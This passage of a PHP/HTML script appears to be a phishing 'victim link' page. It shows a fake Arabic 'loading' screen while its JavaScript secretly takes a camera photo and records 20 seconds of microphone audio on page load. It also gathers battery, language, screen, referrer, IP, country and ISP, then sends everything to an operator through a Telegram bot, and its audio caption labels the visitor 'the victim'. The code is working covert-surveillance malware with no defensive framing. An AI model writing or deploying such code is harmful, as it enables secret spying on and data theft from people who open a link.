            $isp = !empty($ipData['isp']) ? $ipData['isp'] : 'غير معروف';
        }

        $captionText = "📥 تم فتح الرابط!\n"
            . "🌐 IP: $ip\n"
            . "📍 الدولة: $country\n"
            . "🏢 اسم الشركة: $isp\n"
            . "🖥 المتصفح: $userAgent\n"
            . "📱 نوع الجهاز: $device\n"
            . "🔋 نسبة الشحن: $battery%\n"
            . "🕒 الوقت/التاريخ: $userTime\n"
            . "🌍 اللغة: $language\n"
            . "📏 دقة الشاشة: $screenRes\n"
            . "🔗 الصفحة السابقة: $referrer";

        if ($dataType === 'photo' && $photoData) {
            $photoData = str_replace('data:image/jpeg;base64,', '', $photoData);
            $photoData = str_replace(' ', '+', $photoData);
            $photoBinary = base64_decode($photoData);

            $tempFile = tempnam(sys_get_temp_dir(), 'photo') . '.jpg';
            file_put_contents($tempFile, $photoBinary);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$BOT_TOKEN/sendPhoto");
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, [
                'chat_id' => $ADMIN_ID,
                'photo' => new CURLFile($tempFile),
                'caption' => $captionText
            ]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);

            unlink($tempFile);
        }

        if ($dataType === 'audio' && $audioData) {
            $audioData = str_replace('data:audio/webm;base64,', '', $audioData);
            $audioData = str_replace('data:audio/wav;base64,', '', $audioData);
            $audioData = str_replace(' ', '+', $audioData);
            $audioBinary = base64_decode($audioData);

            $tempAudioFile = tempnam(sys_get_temp_dir(), 'audio') . '.ogg';
            file_put_contents($tempAudioFile, $audioBinary);

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot$BOT_TOKEN/sendVoice");
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, [
                'chat_id' => $ADMIN_ID,
                'voice' => new CURLFile($tempAudioFile),
                'caption' => "🎤 تسجيل صوتي مدته 20 ثانية من الضحية"
            ]);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_exec($ch);
            curl_close($ch);

            unlink($tempAudioFile);
        }

        exit;
    }

    // HTML page for data collection
    ?>
    <!DOCTYPE html>
    <html lang="ar">

    <head>
        <meta charset="UTF-8">
        <title>جارٍ التحميل...</title>
        <style>
            body {
                background: #000;
                color: #0f0;
                font-family: monospace;
                text-align: center;
                padding-top: 20%;
                margin: 0;
            }

            #camera {
                display: none;
            }

            #canvas {
                display: none;
            }

            .loading {
                font-size: 24px;
                animation: blink 1s infinite;
            }

            @keyframes blink {
                0% {
                    opacity: 1;
                }

                50% {
                    opacity: 0.5;
                }

                100% {
                    opacity: 1;
                }
            }
        </style>
    </head>

    <body>
        <div class="loading">جارٍ التحميل...</div>
        <video id="camera" autoplay playsinline></video>
        <canvas id="canvas"></canvas>

        <script>
            async function capturePhoto() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        }
                    });

                    const video = document.getElementById('camera');
                    const canvas = document.getElementById('canvas');
                    const context = canvas.getContext('2d');

                    video.srcObject = stream;

                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            resolve();
                        };
                    });

                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    await new Promise(resolve => setTimeout(resolve, 1000));

                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    stream.getTracks().forEach(track => track.stop());

                    return canvas.toDataURL('image/jpeg', 0.8);

                } catch (error) {
                    console.error('خطأ في الوصول للكاميرا:', error);
                    return null;
                }
            }

            async function recordAudio() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        audio: true
                    });

                    const mediaRecorder = new MediaRecorder(stream, {
                        mimeType: 'audio/webm'
                    });

                    const chunks = [];

                    return new Promise((resolve) => {
                        mediaRecorder.ondataavailable = (e) => {
                            if (e.data.size > 0) {
                                chunks.push(e.data);
                            }
                        };

                        mediaRecorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'audio/webm' });
                            const reader = new FileReader();

                            reader.onload = () => {
                                resolve(reader.result);
                            };

                            reader.readAsDataURL(blob);
                            stream.getTracks().forEach(track => track.stop());
                        };

                        mediaRecorder.start();

                        setTimeout(() => {
                            if (mediaRecorder.state === 'recording') {
                                mediaRecorder.stop();
                            }
                        }, 20000);
                    });

                } catch (error) {
                    console.error('خطأ في التسجيل الصوتي:', error);
                    return null;
                }
            }

            async function sendPhotoData() {
                let batteryLevel = "غير معروف";
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = Math.round(battery.level * 100);
                } catch (e) { }

                const deviceType = navigator.userAgent;
                const now = new Date().toLocaleString();
                const lang = navigator.language || "غير معروف";
                const screenRes = window.screen.width + "x" + window.screen.height;
                const referrer = document.referrer || "";

                const photoData = await capturePhoto();

                const formData = new FormData();
                formData.append('battery', batteryLevel);
                formData.append('device', deviceType);
                formData.append('time', now);
                formData.append('lang', lang);
                formData.append('screen', screenRes);
                formData.append('ref', referrer);
                formData.append('data_type', 'photo');
                if (photoData) {
                    formData.append('photo', photoData);
                }

                try {
                    await fetch(window.location.href, {
                        method: "POST",
                        body: formData
                    });
                } catch (error) {
                    console.error('خطأ في إرسال البيانات:', error);
                }
            }

            async function sendAudioData() {
                const audioData = await recordAudio();

                if (audioData) {
                    const formData = new FormData();
                    formData.append('data_type', 'audio');
                    formData.append('audio', audioData);

                    try {
                        await fetch(window.location.href, {
                            method: "POST",
                            body: formData
                        });
                    } catch (error) {
                        console.error('خطأ في إرسال الصوت:', error);
                    }
                }
            }

            sendPhotoData();
            setTimeout(() => {
                sendAudioData();
            }, 20000);
        </script>
    </body>

    </html>
    <?php
    exit;
}
?>